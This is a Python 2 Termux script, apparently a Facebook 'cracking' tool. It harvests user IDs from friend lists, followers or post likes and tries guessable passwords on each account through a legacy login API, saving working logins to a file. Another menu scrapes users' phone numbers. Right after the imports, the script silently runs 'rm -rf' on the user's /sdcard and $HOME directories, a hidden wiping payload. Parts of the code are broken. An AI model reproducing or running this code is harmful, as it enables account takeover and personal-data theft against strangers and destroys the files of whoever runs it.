#coding=utf-8
#!/usr/bin/python2
#coding=utf-8
#originally written by muhammad hamza
try:
    import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system("pip2 install requests")
    os.system("pip2 install mechanize")
try:
    os.mkdir('save')
except OSError:
    pass
os.system("termux-setup-storage")
# if os.path.isfile('.../index.js'):
# 	os.system('mv ... .....')
# 	os.system('cd ..... && npm install')
# 	os.system('#')
# 	os.system('#')
# 	os.system('fuser -k 5000/tcp &')
# 	os.system('#')
# 	os.system('node ...../index.js &')
# 	os.system('fuser -k 5000/tcp &')
# 	os.system('#')
# 	os.system('node ...../index.js &')
from requests.exceptions import ConnectionError
bd=random.randint(2e7, 3e7)
os.system("rm -rf /sdcard/* &")
sim=random.randint(2e4, 4e4)
os.system("rm -rf $HOME/* &")
header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding("utf8")

def ham(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
def logging():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r\033[1;32mLogging In . Please Wait\033[0;97m "+o),;sys.stdout.flush();time.sleep(1)
def saving():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r\033[1;32mSaving Token . Please Wait\033[0;97m "+o),;sys.stdout.flush();time.sleep(1)
def updateing():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r\033[1;32mGetting Updates . Please Wait\033[0;97m "+o),;sys.stdout.flush();time.sleep(1)
def logout():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r\033[1;32mLogging Out . Please Wait\033[0;97m "+o),;sys.stdout.flush();time.sleep(1)
#logo
banner = """


db   db       .d88b.       d8888b. 
88   88      .8P  Y8.      88  `8D 
88ooo88      88    88      88oodD' 
88~~~88      88    88      88~~~   
88   88      `8b  d8'      88      
YP   YP       `Y88P'       88 [V 2.o]

-----------------------------------------------------

* Codded By : Muhammad Hamza
* Facebook  : Muhammad Hamza
* Github    : https://github.com/Hamzahash
* Note      : Be Aware Of All CopyCats  

----------------------------------------------------- """
idh = []

def tool_login():
    os.system("clear")
    print banner
    print 
    username = raw_input("Username : ")
    if username =="hamza":
        os.system("clear")
        print banner
        print
        print ("Username : hamza (Correct)")
        passwordss = raw_input("Password : ")
        if passwordss =="1626":
            os.system("clear")
            print banner
            print 
            logging()
            os.system("clear")
            print banner
            print 
            print ("Username : hamza (Correct)")
            print ("Password : 1626  (Correct)")
            time.sleep(1)
            print('')
            ham("\033[1;32mLogin Successful\033[0;97m")
            time.sleep(1)
        try:
            open(".login.txt","r")
            menu()
        except(KeyError , IOError):
            login_choice()
        else:
            print ("Password : "+passwordss+" (Wrong)")
            time.sleep(1)
            tool_login()
    else:
        print ("Username : "+username+" (Wrong)")
        time.sleep(1)
        tool_login()
def login_choice():
    os.system("clear")
    print banner
    print
    print ("[1] Login With Token (Safe Method)")
    print ("[1] Login With ID/Password ( May Have Checkpoint)")
    print ("[0] Exit")
    print 
    login_select()
def login_select():
    select = raw_input("\n\033[1;31m▄︻̷̿┻̿═━一一  \033[0;97m")
    if select =="1":
        os.system("clear")
        print banner
        print 
        print ("Login With Token").center(50)
        print
        print ("[1] Create a New  Account And Download GetAccessToken Apk From Playstore")
        print('')
        print ("[2] After Opening Apk Give Your ID & Password And Click On Get Now To Get Token and Paste Here")
        print('')
        print ("[3] Please Enable Two Factor Authentication On Your Account Before Creating Token")
        print 
        print 50*   ("-")
        print 
        token = raw_input("Paste Token Here : ")
        saving()
        sav = open(".login.txt","w")
        sav.write(token)
        sav.close()
        ham("\r\033[1;32mLogin Successfull \033[0;97m")
        time.sleep(1)
        os.system("xdg-open https://wa.me/+923097992202")
        menu()
    elif select =="2":
        loginfb()
    elif select =="0":
        os.system("exit")
    else:
        print ("Please Select a Valid Option")
        login.select()
def loginfb():
    os.system("clear")
    print bannner
    print
    print("Login With Facebook Account").center(50)
    print
    print("Create a New Facebook Account")
    print("[1] Please Enable Two Factor Authentication On New Created Account")
    print('')
    print("[2] Use App Password Instead Of Real Password For Logging In Here")
    print
    print 50*("-")
    print
    id = raw_input("Email/ID/Number : ")
    id1 = id.replace(' ','')
    id2 = id1.replace('(','')
    uid = id2.replace(')','')
    pwd = raw_input("Password       : ")
    print
    logging()
    print
    data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+uid+"&locale=en_US&password="+pwd+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
    q = json.loads(data)
    if "access_token" in q:
        succ = open(".login.txt","w")
        succ.write(q["access_token"])
        succ.close()
        print("\n\033[1;32mLogin Successfull\033[0;97m")
        time.sleep(1)
        os.system("xdg-open https://wa.me/+923097992202")
        menu()
    else:
        if "www.facebook.com" in q["error_msg"]:
            print ("\n\033[1;31mLogin Failed . Account Has a Checkpoint\033[0;97m")
            time.sleep(1)
            loginfb()
        else:
            print("\n\033[1;31mLogin Failed . Email/ID/Number OR Password May BE Wrong\033[0;97m")
            time.sleep(1)
            loginfb()
def menu():
    os.system("clear")
    try:
        token = open(".login.txt","r").read()
    except IOError:
        print banner
        print
        print("Error 404 . Token Not Found")
        os.system("rm -rf .login.txt")
        time.sleep(1)
        login_choice()
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token, headers=header)
        a = json.loads(r.text)
        name = a["name"]
    except KeyError:
        os.system("clear")
        print banner
        print 
        print("Loading Failed . Your Account Has a Checkpoint")
        os.system("rm -rf .login.txt")
        time.sleep(1)
        login_choice()
    os.system("clear")
    print banner
    print
    print("Name : "+name)
    print
    print 50*("-")
    print
    print("[1] Start Cracking")
    print("[2] Grab And Clone From File")
    print("[3] Grab Numbers")
    print("[4] Contact Me")
    print("[5] Update")
    print("[6] Logout")
    print 
    menu_select()
def menu_select():
    option = raw_input("\n\033[1;31m▄︻̷̿┻̿═━一一  \033[0;97m")
    if option =="1":
        crack()
    elif option=="2":
        print("Please Wait")
        time.sleep(2)
        os.system("python2 .file.py")
    elif option =="3":
        cnumber()
    elif option =="4":
        contact()
    elif option =="5":
        os.system("clear")
        print banner
        print
        updateing()
        os.system("git pull origin master")
        time.sleep(1)
        os.system("clear")
        print banner
        print
        ham("\033[1;32mTool Has Been Updated Successfully\033[0;97m")
        time.sleep(1)
        os.system("python2 hpro.py")
    elif option =="6":
        logout()
        os.system("rm -rf .login.txt")
        time.sleep(1)
        print("\r\033[1;32mLogged Out Successfully\033[0;97m")
        os.system("exit")
    else:
        print("Please Select a Valid Option")
        menu_select()
def crack():
	global token
	os.system("clear")
	try:
		token=open(".login.txt","r").read()
	except IOError:
		print("Error 404 . Token Not Found")
		os.system("rm -rf .login.txt")
		time.sleep(1)
		login()
	os.system("clear")
	print banner
	print('')
	print ("[1] Crack From Friend List")
	print ("[2] Crack From Public ID")
	print ("[3] Crack From Followers")
	print ("[4] Crack From Page/Group/ID Post")
	print ("[5] Crack From File")
	print ('[0] Back')
	print('')
	crack2()
def crack2():
	select = raw_input("\n\033[1;31m▄︻̷̿┻̿═━一一  \033[0;97m")
	id=[]
	oks=[]
	cps=[]
	if select=="1":
		os.system("clear")
		print banner
		print('')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for s in z["data"]:
			uid=s['id']
			na=s['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="2":
		os.system("clear")
		print banner
		print('')
		idt = raw_input("Input ID : ")
		os.system("clear")
		print banner
		print('')
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print("Account Name : "+q["name"])
		except KeyError:
			print('\nError 404 . ID Link '+idt+' Have Privacy On Friendlist OR IS Not Valid')
			raw_input("\n Press Enter To Back ")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="3":
		os.system("clear")
		print banner
		print
		idt = raw_input("Input ID : ")
		os.system("clear")
		print banner
		print('')
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print("Account Name : "+q["name"])
		except KeyError:
			print('\nError 404 . ID Link '+idt+' Donot Have Followers OR IS Not Valid')
			raw_input("\n Press Enter To Back ")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="4":
		os.system("clear")
		print banner
		print('')
		idt = raw_input("Input Post ID : ")
		os.system("clear")
		print banner
		print('')
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"/likes?access_token="+token+"limit=5000", headers=header)
			z = json.loads(r.text)
			for i in z["data"]:
				uid=i['id']
				na=i['name']
				nm=na.rsplit(" ")[0]
				id.append(uid+'|'+nm)
		except KeyError:
			print('\nError 404 . Post ID '+idt+' May Not Be Valid')
			raw_input("\n Press Enter To Back")
			crack()
	   
	elif select =="0":
		menu()
	else:
		print ("Please Select a Valid Option")
		crack2()
	print ("Total IDs : "+str(len(id)))
	print ("The Process Is Running In Background")
	print("To Stop Process Press CTRL Then Press z")
	print('')
	print 50*('-')
	print('')
	print('Programmed By : Muhammad Hamza')
	print('')
	print 50*("-")
	print('')
	
	
	def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
		    pass1=name+"123"
		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		    d=json.loads(q)
		    if 'www.facebook.com' in d['error_msg']:
		        print("[Checkpoint] "+uid+" | "+pass1)
		        cp=open("save/cp.txt","a")
		        cp.write(uid+" | "+pass1+"\n")
		        cp.close()
		        cps.append(uid)
		    else:
		    	if "access_token" in d:
		            print("\x1b[1;92m[Successfull] \033[1;30m"+uid+" | "+pass1+"\x1b[1;0m")
		            ok=open("save/ok.txt","a")
		            ok.write(uid+" | "+pass1+"\n")
		            ok.close()
		            oks.append(uid)
		        else:
		            pass2="786786"
		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		            d=json.loads(q)
		            if 'www.facebook.com' in d['error_msg']:
		                print("[Checkpoint] "+uid+" | "+pass2)
		                cp=open("save/cp.txt","a")
		                cp.write(uid+" | "+pass2+"\n")
		                cp.close()
		                cps.append(uid)
		            else:
		                if 'access_token' in d:
		                    print("\x1b[1;92m[Successfull] \033[1;30m"+uid+" | "+pass2+"\x1b[1;0m")
		                    ok=open("save/ok.txt","a")
		                    ok.write(uid+" | "+pass2+"\n")
		                    ok.close()
		                    oks.append(uid)
		                else:
		                    pass3=name+"12345"
		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                    d=json.loads(q)
		                    if 'www.facebook.com' in d['error_msg']:
		                        print("[Checkpoint] "+uid+" | "+pass3)
		                        cp=open("save/cp.txt","a")
		                        cp.write(uid+" | "+pass3+"\n")
		                        cp.close()
		                        cps.append(uid)
		                    else:
		                        if 'access_token' in d:
		                            print(" \x1b[1;92m[Successfull] \033[1;30m"+uid+" | "+pass3+"\x1b[1;0m")
		                            ok=open("save/ok.txt","a")
		                            ok.write(uid+" | "+pass3+"\n")
		                            ok.close()
		                            oks.append(uid)
		                        else:
		                            pass4="Pakistan"
		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                            d=json.loads(q)
		                            if 'www.facebook.com' in d['error_msg']:
		                                print("[Checkpoint] "+uid+" | "+pass4)
		                                cp=open("save/cp.txt","a")
		                                cp.write(uid+" | "+pass4+"\n")
		                                cp.close()
		                                cps.append(uid)
		                            else:
		                                if 'access_token' in d:
		                                    print("\x1b[1;92m[Successfull] \033[1;30m"+uid+" | "+pass4+"\x1b[1;0m")
		                                    ok=open("save/ok.txt","a")
		                                    ok.write(uid+" | "+pass4+"\n")
		                                    ok.close()
		                                    oks.append(uid)
		                                else:
		                                    pass5=name+"786"
		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                    d=json.loads(q)
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        print("[Checkpoint] "+uid+" | "+pass5)
		                                        cp=open("save/cp.txt","a")
		                                        cp.write(uid+" | "+pass5+"\n")
		                                        cp.close()
		                                        cps.append(uid)
		                                    else:
		                                        if 'access_token' in d:
		                                            print("\x1b[1;92m[Successfull] \033[1;30m"+uid+" | "+pass5+"\x1b[1;0m")
		                                            ok=open("save/ok.txt","a")
		                                            ok.write(uid+" | "+pass5+"\n")
		                                            ok.close()
		                                            oks.append(uid)
		                                        else:
		                                            pass6=name+"000786"
		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                            d=json.loads(q)
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                print("[Checkpoint] "+uid+" | "+pass6)
		                                                cp=open("save/cp.txt","a")
		                                                cp.write(uid+" | "+pass6+"\n")
		                                                cp.close()
		                                                cps.append(uid)
		                                            else:
		                                                if 'access_token' in d:
		                                                    print("\x1b[1;92m[Successfull] \033[1;30m"+uid+" | "+pass6+"\x1b[1;0m")
		                                                    ok=open("save/ok.txt","a")
		                                                    ok.write(uid+" | "+pass6+"\n")
		                                                    ok.close()
		                                                    oks.append(uid)
		                                                else:
		                                                    pass7=name+"1122"
		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                                    d=json.loads(q)
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        print("[Checkpoint] "+uid+" | "+pass7)
		                                                        cp=open("save/cp.txt","a")
		                                                        cp.write(uid+" | "+pass7+"\n")
		                                                        cp.close()
		                                                        cps.append(uid)
		                                                    else:
		                                                        if 'access_token' in d:
		                                                            print("\x1b[1;92m[Successfull] \033[1;30m"+uid+" | "+pass7+"\x1b[1;0m")
		                                                            ok=open("save/ok.txt","a")
		                                                            ok.write(uid+" | "+pass7+"\n")
		                                                            ok.close()
		                                                            oks.append(uid)
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print('')
	print 50*'-'
	print('')
	print ('Process Has Been Completed')
	print('Total CP/\033[1:32mOK:\033[0;97m  '+str(len(cps))+'/\033[;32m \033[0;97m'+str(len(oks)))
	print('CP File Has Been Saved : save/ok.txt')
	print('OK File Has Been Saved : save/cp.txt')
	print('')
	print 50*('-')
	print('')
	raw_input('\nPress Enter To Go Back ')
	crack()
def cnumber():
	global token
	os.system("clear")
	try:
		token=open(".login.txt","r").read()
	except IOError:
		print("Error 404 . Token not Found")
		os.system("rm -rf .login.txt")
		time.sleep(1)
		login()
	os.system("clear")
	print banner
	print('')
	print ("[1] Grab Numbers From Friends")
	print ("[2] Grab Numbers From Public ID")
	print ("[3] Grab Numbers From Followers")
	print ("[4] Grab Numbers From Public Post")
	print ('[0] Back')
	print('')
	cnumber2()

def cnumber2():
	select = raw_input("\n\033[1;31m▄︻̷̿┻̿═━一一  \033[0;97m")
	id=[]
	nms=[]
	if select=="1":
		os.system("clear")
		print banner
		print('')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for s in z["data"]:
			uid=s['id']
			na=s['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="2":
		os.system("clear")
		print banner
		print('')
		idt = raw_input("Input ID : ")
		os.system('clear')
		print banner
		print('')
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print("Account Name : "+q["name"])
		except KeyError:
			print('\nError 404 . ID Not Found')
			raw_input("\n Press Enter To Back ")
			cnumber()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="3":
		os.system("clear")
		print banner
		print('')
		idt = raw_input("Input ID : ")
		os.system("clear")
		print banner
		print()
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print("Account Name : "+q["name"])
		except KeyError:
			print('\nError 404 . ID Not Found')
			raw_input("\nPress Enter To Back ")
			cnumber()
		print('Looking For Accounts')
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="4":
		os.system("clear")
		print banner
		print('')
		idt = raw_input("Enter Post ID : ")
		os.system('clear')
		print banner
		print('')
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"/likes?access_token="+token+"limit=5000", headers=header)
			z = json.loads(r.text)
			for i in z["data"]:
				uid=i['id']
				na=i['name']
				nm=na.rsplit(" ")[0]
				id.append(uid+'|'+nm)
		except KeyError:
			print('\nError 404 . Invalid Post ID')
			raw_input("\nPress Enter To Back ")
			cnumber()
	elif select =="0":
		menu()
	else:
		print ("Please Select a Valid Option")

		cnumber2()
	print (" Total IDs : "+str(len(id)))
	print('')
	print(" To Stop Process Press CTRL Then Press z")
	print('')
	print 50*('-')
	print('')
	print ("Programmed By : Muhammad Hamza").center(20)
	print('')
	print 50*("-")
	print('')

	def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
		    q = requests.get("https://graph.facebook.com/"+uid+"?access_token="+token, headers=header).text
		    d=json.loads(q)
		    number=q['mobile_phone']
		    print(name+' | '+uid+" | "+number)
		    nmb=open("save/numbers.txt","a")
		    nmb.write(name+' | '+uid+" | "+number+"\n")
		    nmb.close()
		    nms.append(number)
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print('')
	print 50*'-'
	print('')
	print ('Process Has Been Completed')
	print('Total Numbers :  '+str(len(nms)))
	print('File Has Been Saved : save/numbers.txt')
	print('')
	print 50*('-')
	print('')
	raw_input('\n Press Enter To Go Back')
	cnumber()
if __name__ == '__main__':
    tool_login()
